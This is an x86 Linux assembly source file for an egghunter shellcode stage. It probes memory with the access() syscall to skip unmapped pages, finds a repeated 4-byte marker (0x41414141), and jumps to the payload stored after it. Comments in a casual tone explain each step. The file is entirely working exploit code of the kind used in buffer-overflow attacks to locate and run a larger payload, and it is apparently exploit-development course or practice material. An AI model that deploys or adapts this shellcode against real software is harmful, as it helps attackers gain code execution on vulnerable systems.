global _start

section .text

_start:
	; zero edx for kicks
	xor edx, edx

fix_page:
	
	; This is a hacky fix for page sizes
	; 0xfff is 4095, so we inc edx later on to avoid nulls
	; page fix is only called if we need some gud gud memory
	or dx, 0xfff

egghunter:

	inc edx

	; int access(const char *pathname, int mode)

	; Give ebx an arbitrary address within the page
	lea ebx, [edx + 4]
	
	; push, pop, syscall for access() 
	push dword 0x21
	pop eax
	int 0x80

	; compare access() return for errors
	; fix the page and get to gud gud memory
	; but only if we got bad memory :[
	cmp al, 0xf2
	je fix_page

	; if not, load our egg into eax
	mov eax, 0x41414141

	; load the memory to scan into edi
	mov edi, edx

	; Scan it, jump to egghunter if no match
	scasd
	jnz egghunter

	; Do that again, just to be sure
	scasd
	jnz egghunter

	; If we got here, it's valid!
	jmp edi

